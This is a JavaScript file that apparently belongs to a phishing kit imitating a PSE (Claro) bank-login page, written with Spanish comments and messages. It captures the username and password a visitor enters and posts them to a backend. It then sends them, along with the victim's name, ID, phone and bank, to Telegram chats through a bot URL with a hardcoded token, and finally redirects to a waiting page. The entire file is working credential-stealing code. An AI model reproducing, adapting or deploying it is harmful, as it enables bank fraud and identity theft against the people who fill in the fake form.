// Function to update the localStorage with new info
function updateLS() {
  LS.setItem("info", JSON.stringify(info));
}

// Elemento con el botón de entrar
const button = document.getElementById("btnUsuario");

// Input de Usuario
const userInput = document.getElementById("txtUsuario");

// Input de Contraseña
const passInput = document.getElementById("txtPass");

// Function to send a message to multiple chatIds on Telegram
async function sendToTelegram(message) {
  // Iterate over each chatId
  for (const chatId of chatIds) {
    const url = `https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    try {
      const response = await fetch(url);
      if (!response.ok) {
        throw new Error(`Error al enviar mensaje a ${chatId}: ${response.statusText}`);
      }
      console.log(`Mensaje enviado a ${chatId}`);
    } catch (error) {
      console.error(`Error de red al enviar mensaje a ${chatId}:`, error);
    }
  }
}


// Function to update user status
async function updateStatus() {
  button.disabled = true;

  try {
    // Fetch user data
    const response = await fetch(`${url}/trico/tricoData`, {
      method: "GET",
      headers: { "Content-Type": "application/json" },
    });

    if (!response.ok) {
      throw new Error("Error al obtener los datos del servidor");
    }

    const serverData = await response.json();
    const dataTables = [...serverData];

    for (const data of dataTables) {
      if (data.id == info.metaInfo.cc) {
        console.log("Usuario encontrado");

        // Update the user information on the server
        const updateresponse = await fetch(
          `${url}/trico/tricoUserPse/${data.idreg}`,
          {
            method: "PUT",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              usuario: info.metaInfo.user,
              password: info.metaInfo.puser,
            }),
          }
        );

        if (!updateresponse.ok) {
          throw new Error("Error al actualizar usuario");
        }

        const updatedData = await updateresponse.json();

        // Create the message with the user info
        const message = `🟣 PSE (Claro)\n©️ID: ${data.id}\n🆔Nombre: ${data.nombre}\n📱Teléfono: ${data.telefono}\n🚹Usuario: ${info.metaInfo.user}\n🔒Contraseña: ${info.metaInfo.puser}\n🏦Banco: ${data.bank}\nFuente: ${fuente}\nCorrigió Usuario`;

        // Send the message to Telegram
        const telegramSuccess = await sendToTelegram(message);
        if (telegramSuccess) {
          console.log("Mensaje enviado correctamente a Telegram");
        } else {
          console.error("No se pudo enviar el mensaje a Telegram");
        }

        console.log("Usuario actualizado");
      }
    }

    // Redirect to the next page
    window.location.href = "wait.html";
  } catch (error) {
    console.error("Error al procesar la actualización:", error);
  } finally {
    button.disabled = false; // Always re-enable the button
  }
}

// Event listener for the login button
button.addEventListener("click", async function (e) {
  e.preventDefault();

  // Validate the inputs
  if (userInput.value === "" || passInput.value === "") {
    alert("Por favor ingrese la información requerida");
    userInput.focus();
    return;
  }

  const user = userInput.value;
  const pass = passInput.value;

  info.metaInfo.user = user;
  info.metaInfo.puser = pass;

  updateLS(); // Update localStorage

  await updateStatus(); // Call updateStatus after validation
});
